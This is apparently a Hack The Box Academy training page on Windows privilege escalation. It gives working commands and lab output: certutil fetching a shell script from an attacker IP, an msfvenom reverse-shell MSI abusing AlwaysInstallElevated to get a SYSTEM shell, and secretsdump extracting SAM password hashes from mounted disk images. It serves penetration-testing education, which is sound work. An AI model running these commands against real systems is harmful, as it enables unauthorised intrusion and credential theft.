<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/67/section/635
// Platform Version: V1
// Module ID: 67
// Module Name: Windows Privilege Escalation
// Module Difficulty: Medium
// Section ID: 635
// Section Title: Miscellaneous Techniques
// Page Title: Windows Privilege Escalation
// Page Number: 27
-->

# Miscellaneous Techniques

**Module Name:** Windows Privilege Escalation **Page Number:** 27

#### WINDOWS PRIVILEGE ESCALATION

# Miscellaneous Techniques

## Living Off The Land Binaries and Scripts (LOLBAS)

#### Transferring File with Certutil

``` powershell-session
PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

#### Encoding File with Certutil

``` cmd-session
C:\htb> certutil -encode file1 encodedfile

Input Length = 7
Output Length = 70
CertUtil: -encode command completed successfully
```

#### Decoding File with Certutil

``` cmd-session
C:\htb> certutil -decode encodedfile file2

Input Length = 70
Output Length = 7
CertUtil: -decode command completed successfully.
```

## Always Install Elevated

![https://academy.hackthebox.com/storage/modules/67/alwaysinstall.png](https://academy.hackthebox.com/storage/modules/67/alwaysinstall.png)

#### Enumerating Always Install Elevated Settings

``` powershell-session
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

``` powershell-session
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

#### Generating MSI Package

``` shell-session
[!bash!]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
```

#### Executing MSI Package

``` cmd-session
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

#### Catching Shell

``` shell-session
[!bash!]$ nc -lnvp 9443

listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.33] 49720
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
nt authority\system
```

## CVE-2019-1388

![https://academy.hackthebox.com/storage/modules/67/hhupd.png](https://academy.hackthebox.com/storage/modules/67/hhupd.png)

![https://academy.hackthebox.com/storage/modules/67/hhupd_details.png](https://academy.hackthebox.com/storage/modules/67/hhupd_details.png)

![https://academy.hackthebox.com/storage/modules/67/hhupd_ok.png](https://academy.hackthebox.com/storage/modules/67/hhupd_ok.png)

![https://academy.hackthebox.com/storage/modules/67/chrome_system.png](https://academy.hackthebox.com/storage/modules/67/chrome_system.png)

![https://academy.hackthebox.com/storage/modules/67/hhupd_saveas.png](https://academy.hackthebox.com/storage/modules/67/hhupd_saveas.png)

![https://academy.hackthebox.com/storage/modules/67/hhupd_cmd.png](https://academy.hackthebox.com/storage/modules/67/hhupd_cmd.png)

## Scheduled Tasks

#### Enumerating Scheduled Tasks

``` cmd-session
C:\htb>  schtasks /query /fo LIST /v
 
Folder: \
INFO: There are no scheduled tasks presently available at your access level.
 
Folder: \Microsoft
INFO: There are no scheduled tasks presently available at your access level.
 
Folder: \Microsoft\Windows
INFO: There are no scheduled tasks presently available at your access level.
 
Folder: \Microsoft\Windows\.NET Framework
HostName:                             WINLPE-SRV01
TaskName:                             \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        5/27/2021 12:23:27 PM
Last Result:                          0
Author:                               N/A
Task To Run:                          COM handler
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        On demand only
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

<SNIP>
```

#### Enumerating Scheduled Tasks with PowerShell

``` powershell-session
PS C:\htb> Get-ScheduledTask | select TaskName,State
 
TaskName                                                State
--------                                                -----
.NET Framework NGEN v4.0.30319                          Ready
.NET Framework NGEN v4.0.30319 64                       Ready
.NET Framework NGEN v4.0.30319 64 Critical           Disabled
.NET Framework NGEN v4.0.30319 Critical              Disabled
AD RMS Rights Policy Template Management (Automated) Disabled
AD RMS Rights Policy Template Management (Manual)       Ready
PolicyConverter                                      Disabled
SmartScreenSpecific                                     Ready
VerifiedPublisherCertStoreCheck                      Disabled
Microsoft Compatibility Appraiser                       Ready
ProgramDataUpdater                                      Ready
StartupAppTask                                          Ready
appuriverifierdaily                                     Ready
appuriverifierinstall                                   Ready
CleanupTemporaryState                                   Ready
DsSvcCleanup                                            Ready
Pre-staged app cleanup                               Disabled

<SNIP>
```

#### Checking Permissions on C:\Scripts Directory

``` cmd-session
C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
C:\Scripts
  RW BUILTIN\Users
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

## User/Computer Description Field

#### Checking Local User Description Field

``` powershell-session
PS C:\htb> Get-LocalUser
 
Name            Enabled Description
----            ------- -----------
Administrator   True    Built-in account for administering the computer/domain
DefaultAccount  False   A user account managed by the system.
Guest           False   Built-in account for guest access to the computer/domain
helpdesk        True
htb-student     True
htb-student_adm True
jordan          True
logger          True
sarah           True
sccm_svc        True
secsvc          True    Network scanner - do not change password
sql_dev         True
```

#### Enumerating Computer Description Field with Get-WmiObject Cmdlet

``` powershell-session
PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description
 
Description
-----------
The most vulnerable box ever!
```

## Mount VHDX/VMDK

#### Mount VMDK on Linux

``` shell-session
[!bash!]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

#### Mount VHD/VHDX on Linux

``` shell-session
[!bash!]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

![https://academy.hackthebox.com/storage/modules/67/mount.png](https://academy.hackthebox.com/storage/modules/67/mount.png)

#### Retrieving Hashes using Secretsdump.py

``` shell-session
[!bash!]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x35fb33959c691334c2e4297207eeeeba
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)

<SNIP>
```

# 

# 

#### Questions

####